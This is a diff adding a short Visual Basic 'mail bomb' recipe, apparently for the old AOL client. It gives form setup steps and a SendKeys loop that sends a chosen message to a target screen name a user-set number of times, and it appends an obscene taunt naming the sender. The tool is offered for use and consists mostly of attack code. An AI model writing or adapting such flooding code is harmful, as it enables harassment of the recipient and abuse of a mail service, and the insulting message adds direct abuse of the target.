@@ -1,0 +1,53 @@
+MaiL BoMb
+Make 5 textboxes 
+textbox1 = PeRsonS Sn, textbox2 = mail subject, textbox3 = MaiL MsG, 
+Textbox4 = HoW MaNy TiMeS , Textbox5 = YouR Sn 
+Make 1 command button 
+In The CoMmAnD BuTtOn CoPy AnD PaStE 
+
+
+Dim l001A As Variant 
+
+Dim l0028 As Variant 
+
+l001A = Text4 
+
+For l0028 = 1 To l001A 
+
+AppActivate "America Online" 
+
+SendKeys "^m" 
+
+SendKeys Text1.Text 
+
+SendKeys "{TAB}" 
+
+SendKeys "{TAB}" 
+
+SendKeys Text2.Text 
+
+SendKeys "{TAB}" 
+
+SendKeys Text3.Text 
+
+SendKeys "{enter}" 
+
+sendkeys "YouR BoX WuZ BoMbEd By" + text5.text +"AnD He WaS 
+
+UzInG'AsShOlE By Ass" 
+
+SendKeys "{ENTER}" 
+
+SendKeys "{TAB}" 
+
+SendKeys " " 
+
+timeout (2) 
+
+Next l0028 
+
+'form1.show PuT FoRm NaMe 
+
+
+
+YoU NeED MaStEr2.BaS 
